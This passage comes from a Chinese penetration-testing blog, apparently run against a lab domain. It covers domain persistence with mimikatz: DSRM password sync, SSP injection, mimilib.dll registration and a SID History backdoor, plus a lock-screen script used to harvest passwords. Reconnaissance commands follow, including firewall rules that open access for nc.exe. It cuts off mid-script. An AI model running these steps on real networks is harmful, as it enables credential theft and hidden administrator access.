<p>除了向上面那样直接修改DSRM账户的密码外，我们还可以为DSRM同步为一个普通域用户的密码。但是要注意，如果域控制器的系统版本为Windows Server 2008，则需要安装 KB961320 补丁才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server 2008以后版本的系统中不需要安装此补丁。</p>
<p>同步的方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil // 进入n</span><br><span class="line">tdsutil set dsrm password // 设置DSRM账户的密码</span><br><span class="line">sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步</span><br><span class="line">q //退出DSRM密码设置模式    </span><br><span class="line">q // 退出ntdsutil</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021635361.png" alt="image-20231002163521309"></p>
<p>之后的操作就和上面所演示的一样了，同样还是读取本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功，然后同样还是修改目标主机DC的DSRM账户登录方式，最后同样还是在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控。</p>
<h3 id="利用-SSP-注入维持权限"><a href="#利用-SSP-注入维持权限" class="headerlink" title="利用 SSP 注入维持权限"></a>利用 SSP 注入维持权限</h3><p>SSP(Security Support Provider)是Windows操作系统<strong>安全机制的提供者</strong>。简单的说，<strong>SSP就是一个DLL文件</strong>，主要用来实现Windows操作系统的<strong>身份认证功能</strong>，例如：NTLM、Kerberos、Negotiate、Secure Channel(Schannel)，Digest、Credential(CredSSP)等等。</p>
<p>SSPI(Security Support Provider Interface)安全支持提供接口，是Windows操作系统在执行认证操作时使用的API接口。也就是说，SSPI是SSP的API接口。</p>
<p>如果我们获得了网络中目标机器的System权限，可以使用该方法进行持久化操作。<strong>其主要原理是：LSA(Local Security Authority)用于身份验证；lsass.exe作为Windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</strong></p>
<p>下面我们来演示一下这种权限维持操作。</p>
<h4 id="方法一：用Mimikatz将伪造的SSP直接注入内存"><a href="#方法一：用Mimikatz将伪造的SSP直接注入内存" class="headerlink" title="方法一：用Mimikatz将伪造的SSP直接注入内存"></a>方法一：用Mimikatz将伪造的SSP直接注入内存</h4><p>我们可以使用Mimikatz将伪造的SSP注入内存，就能够获取lsass.exe进程中的明文密码。这样做不会在系统中留下二进制文件，但如果域控重启，被注入的内存的伪造的SSP将会丢失。</p>
<p>在域控中上传mimikatz并以管理员权限运行，输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021635995.png" alt="image-20231002163535764"></p>
<p>如上图所示，我们成功使用Mimikatz将伪造的SSP注入内存，只要用户在目标主机DC上重新登录（这里指的是注销、锁屏等重新登录，重启不行），登录的用户名和密码将会被记录在C:\Windows\System32\mimilsa.log 文件中。</p>
<p>给出一个Windows锁屏的powershell脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation &#123;</span><br><span class="line"></span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line"></span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line"></span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure>

<p>将该脚本上传到目标主机后，用powershell运行他即可使目标主机锁屏：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell .\Lock-screen.ps1</span><br><span class="line">powershell 目录\Lock-screen.ps1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021636217.png" alt="image-20231002163617105"></p>
<p>此时，如果管理员发现屏幕被锁了并重新登录，他的密码就会被记录在 C:\Windows\System32\mimilsa.log 文件中：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021636927.png" alt="image-20231002163630842"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637915.png" alt="image-20231002163705789"></p>
<p>注意：该方法不会再目标主机中留下二进制文件，但是如果域控重启，被注入的内存的伪造的SSP将会丢失。</p>
<h4 id="方法二：直接上传Mimikatz的mimilib-dll"><a href="#方法二：直接上传Mimikatz的mimilib-dll" class="headerlink" title="方法二：直接上传Mimikatz的mimilib.dll"></a>方法二：直接上传Mimikatz的mimilib.dll</h4><p>该方法是直接将mimikatz中的mimilib.dll放到系统的C:\Windows\System32目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果，但是会在目标主机上留下二进制文件。</p>
<p>首先，我们上传mimilib.dll到目标域控主机的C:\Windows\System32目录下：</p>
<p>然后修改注册表 HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa 的 Security Packages 项，将mimilib.dll添加进去，让其加载新的DLL文件“mimilib.dll”：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637453.png" alt="image-20231002163741375"></p>
<p>这样如果是系统重启后，DLL将会被成功加载，用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log中：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637921.png" alt="image-20231002163750809"></p>
<h3 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h3><p><strong>SID</strong>也就是安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。</p>
<p>在Windows中，每个用户都有自己的SID。SID的作用主要是<strong>跟踪安全主体控制用户连接资源时的访问权限</strong>。</p>
<p><strong>SID History</strong>是在域迁移过程中需要使用的一个属性。</p>
<p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即<strong>如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源</strong>。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。</p>
<p>下面我们演示用mimikatz添加SID History后门的操作。</p>
<p>首先我们在域控制器上新建一个恶意用户“whoami”：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user whoami Liufupeng123 /add</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021638962.png" alt="image-20231002163835861"></p>
<p>然后再域控上传mimikatz，并用管理员权限运行。然后执行如下命令，将域管理员Administrator的SID添加到恶意域用户 whoami 的SID History属性中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中</span><br></pre></td></tr></table></figure>

<p>注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021638565.png" alt="image-20231002163846391"></p>
<p>然后，我们可以用powershell查看一下这个whoami恶意用户的SID History：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021639556.png" alt="image-20231002163903479"></p>
<p>如上图所示，whoami用户的SID History和administrator域管理员的sid相同。那么现在，我们的whoami用户便拥有了administrator域管理员的权限，并可以用该用户登录域控主机：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021639328.png" alt="image-20231002163917209"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252963.html">https://www.freebuf.com/articles/web/252963.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" data-id="cln8p3qxh0005d4tg83vma62i" data-title="内网渗透之权限维持" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-内网渗透之信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
  <time class="dt-published" datetime="2023-04-12T00:14:14.000Z" itemprop="datePublished">2023-04-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网渗透之信息收集</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>信息收集</strong></p>
<p>三问：我是谁？这是哪？我在哪？即判断当前机器，当前机器所处的网络环境(拓扑结构分析)，当前机器所处的区域</p>
<p>我是谁：分析当前机器的角色，web服务器、开发测试服务器、文件服务器、代理服务器、DNS服务器 等等</p>
<p>这是哪：整个内网结构的分析</p>
<p>我在哪：DMZ、办公区、核心区；或者在其他区域</p>
<h1 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h1><p>dos在线手册：<a target="_blank" rel="noopener" href="https://www.shouce.ren/api/dos/#">https://www.shouce.ren/api/dos/#</a></p>
<h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><p>网络配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p>系统信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">提权：https://i.hacking8.com/tiquan/</span><br><span class="line"></span><br><span class="line">在初步获得的shell回显不足时，可以配合通配符和命令findstr</span><br></pre></td></tr></table></figure>

<p>查看系统架构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line"></span><br><span class="line">这个命令判断操作系统位数是不准确的，取决于shell当前的CMD位数（powershell不适用）</span><br></pre></td></tr></table></figure>

<p>查看安装软件信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">在蚁剑拿到的webshell没有此命令的回显，可以&gt; 1.txt后type、more打开</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-WmiObject -class Win32_Product|Select-Object -Property name,version</span><br></pre></td></tr></table></figure>

<p>查看服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p>查看进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">wmic process list brief</span><br><span class="line">含句柄数、进程优先级、进程id、线程数、内存使用等</span><br></pre></td></tr></table></figure>

<p>查看启动程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command</span><br></pre></td></tr></table></figure>

<p>查看计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query</span><br><span class="line"></span><br><span class="line">更具体的用法：</span><br><span class="line">schtasks /query /?</span><br><span class="line"></span><br><span class="line">如遇报错 chcp 437</span><br></pre></td></tr></table></figure>

<p>查看主机统计数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistic workstation</span><br></pre></td></tr></table></figure>

<p>查询用户、组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p>查看在线用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Win10旗舰版</span><br><span class="line">query user || qwinsta </span><br><span class="line"></span><br><span class="line">net localgroup</span><br></pre></td></tr></table></figure>

<p>列出或断开本地计算机与所连接的客户端之间的会话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\stu1.god.org hongrisec@2019 /u:administrator</span><br><span class="line"></span><br><span class="line">注意被连接的计算机可能需要关闭域防火墙，如果不行请排查对应服务</span><br><span class="line"></span><br><span class="line">net session</span><br></pre></td></tr></table></figure>

<p>网络连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -a</span><br></pre></td></tr></table></figure>

<p>补丁信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get caption,description,hotfixid,installedon</span><br></pre></td></tr></table></figure>

<p>共享信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>

<p>查看路由表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">route print</span><br></pre></td></tr></table></figure>

<p>防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;=winServer2003</span><br><span class="line">netsh firewall</span><br><span class="line"></span><br><span class="line">e.g.:netsh firewall add allowedprogram c:\nc.exe &quot;nc&quot; enable</span><br><span class="line"></span><br><span class="line">2.&gt;winServer2003</span><br><span class="line">netsh advfirewall</span><br><span class="line"></span><br><span class="line">e.g.：netsh advfirewall firewall add rule name=&quot;nc&quot; dir=in(入站) action=allow program=&quot;c:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许程序的具体某个端口、协议入站：</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;RD&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>

<p><strong>自动收集</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
<p>wmic_info.bat</p>
<h2 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h2><ul>
<li>本地普通用户</li>
<li>本地管理员用户</li>
<li>域内用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">获取域SID</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<p>查询用户(包含在域种)的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx/domain</span><br></pre></td></tr></table></figure>

<h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">nslookup 域DNS后缀</span><br></pre></td></tr></table></figure>

<p>查询当前登录域及登录用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p>判断主域</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p>会有三种情况：</p>
<p>1.存在域，但当前用户不是域用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统发生错误</span><br></pre></td></tr></table></figure>

<p>2.不存在域，当前网络环境为工作组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找不到域 WORKGROUP 的域控制器。</span><br><span class="line"></span><br><span class="line">请键入 NET HELPMSG 3913 以获得更多的帮助。</span><br></pre></td></tr></table></figure>

<p>3.存在域，且当前用户登录到域中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xxx.xxx 的当前时间是 2023/xx/xx xx:xx:xx</span><br></pre></td></tr></table></figure>

<p>在域用户切换至本地用户 <strong>计算机名\本地用户</strong></p>
<p>工具链接：[<a target="_blank" rel="noopener" href="https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20%26%20%E5%9F%9F%E6%B8%97%E9%80%8F]">https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20%26%20%E5%9F%9F%E6%B8%97%E9%80%8F]</a>(<a target="_blank" rel="noopener" href="https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F">https://pan.wgpsec.org/public/4-后渗透</a> %26 域渗透)</p>
<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><p><strong>NetBIOS</strong></p>
<blockquote>
<p><strong>NetBIOS</strong>，为<strong>网上基本输入输出系统</strong>（英语：Network Basic Input&#x2F;Output System）的缩写，它提供了<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>中的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82">会话层</a>服务，让在不同计算机上运行的不同<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935">程序</a>，可以在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>中，互相连 线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（API）。较古老 的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">操作系统</a>，使用[IEEE 802.2](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IEEE">https://baike.baidu.com/item/IEEE</a> 802.2)与<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IPX%2FSPX">IPX&#x2F;SPX</a>协议，可以使用NetBIOS Frames协议或NetBIOS over <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IPX%2FSPX%E5%8D%8F%E8%AE%AE/659271">IPX&#x2F;SPX协议</a>来运作。现代操作系统，多数都使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915">TCP&#x2F;IP协议</a>，则可透过NetBIOS over TCP&#x2F;IP协议来相互通信</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p>
<p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP&#x2F;IP 网络上的开放NetBIOS 名称服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.7.0/24 </span><br><span class="line">192.168.7.1 \DP</span><br><span class="line">192.168.7.7 TEAMSSIX\DC                 SHARING DC</span><br><span class="line">192.168.7.107   TEAMSSIX\DANIEL7        SHARING</span><br><span class="line">*timeout (normal end of scan)</span><br></pre></td></tr></table></figure>

<p><strong>ICMP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr &quot;TTL&quot; time to live</span><br><span class="line"></span><br><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done</span><br><span class="line">//linux</span><br></pre></td></tr></table></figure>

<p><strong>Telnet</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</span><br></pre></td></tr></table></figure>

<p><strong>TCPing</strong></p>
<p><a target="_blank" rel="noopener" href="https://elifulkerson.com/projects/tcping.php">TCPing</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcping.exe -n 1 192.168.7.7 445</span><br><span class="line"></span><br><span class="line">Probing 192.168.7.7:445/tcp - Port is open - time=1.719ms</span><br><span class="line">Ping statistics for 192.168.7.7:445</span><br><span class="line">    1 probes sent.</span><br><span class="line">    1 successful, 0 failed. (0.00% fail) </span><br><span class="line">Approximate trip times in milli-seconds:</span><br><span class="line">    Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms</span><br></pre></td></tr></table></figure>

<p><strong>scanline</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -n 192.168.7.0-255</span><br><span class="line">ScanLine (TM) 1.01</span><br><span class="line">Copyright (c) Foundstone, Inc. 2002 http://www.foundstone.com</span><br><span class="line">Scan of 256 IPs started at Tue Feb 23 22:07:40 2021</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">192.168.7.7</span><br><span class="line">Responded in 0 ms.</span><br><span class="line">0 hops away</span><br><span class="line">Responds with ICMP unreachable: No</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">192.168.7.107</span><br><span class="line">Responded in 0 ms.</span><br><span class="line">0 hops away</span><br><span class="line">Responds with ICMP unreachable: No</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">192.168.7.110</span><br><span class="line">Responded in 0 ms.</span><br><span class="line">0 hops away</span><br><span class="line">Responds with ICMP unreachable: No</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">Scan finished at Tue Feb 23 22:07:49 2021</span><br><span class="line">3 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs</span><br></pre></td></tr></table></figure>

<p><strong>ARP</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">arp-scan-windows</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 192.168.7.0/24</span><br><span class="line">Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300 </span><br><span class="line">Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500 </span><br><span class="line">Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500 </span><br><span class="line">Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700 </span><br><span class="line">Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500</span><br></pre></td></tr></table></figure>

<p><strong>vbs</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = &quot;192.168.7.&quot;</span><br><span class="line">Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;) </span><br><span class="line">Set objTS = objfso.CreateTextFile(&quot;C:\Result.txt&quot;)</span><br><span class="line">For i = 1 To 254 </span><br><span class="line">strComputer = strSubNet &amp; i</span><br><span class="line">blnResult = Ping(strComputer)</span><br><span class="line">If blnResult = True Then</span><br><span class="line">objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot; </span><br><span class="line">End If</span><br><span class="line">Next </span><br><span class="line">objTS.Close</span><br><span class="line">WScript.Echo &quot;All Ping Scan , All Done ! :) &quot; </span><br><span class="line">Function Ping(strComputer)</span><br><span class="line">Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;)</span><br><span class="line">Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot; &amp; strComputer &amp; &quot;&#x27;&quot;)</span><br><span class="line">For Each objItem In colItems </span><br><span class="line">Select case objItem.StatusCode </span><br><span class="line">Case 0</span><br><span class="line">Ping = True </span><br><span class="line">Case Else </span><br><span class="line">Ping 